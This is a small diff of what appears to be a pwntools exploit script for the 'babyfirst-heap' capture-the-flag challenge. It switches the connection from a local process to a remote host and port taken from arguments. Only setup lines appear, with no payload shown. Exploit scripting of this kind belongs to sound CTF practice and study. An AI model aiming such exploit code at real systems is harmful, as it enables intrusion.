@@ -8,7 +8,8 @@ elf = ELF('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
 rop = ROP(elf)
 
 # Connect and skip header
-r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
+# r = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')
+r = remote(args['HOST'], int(args['PORT']))
 r.recvuntil('address.\n')
 
 # Receive the heap locations
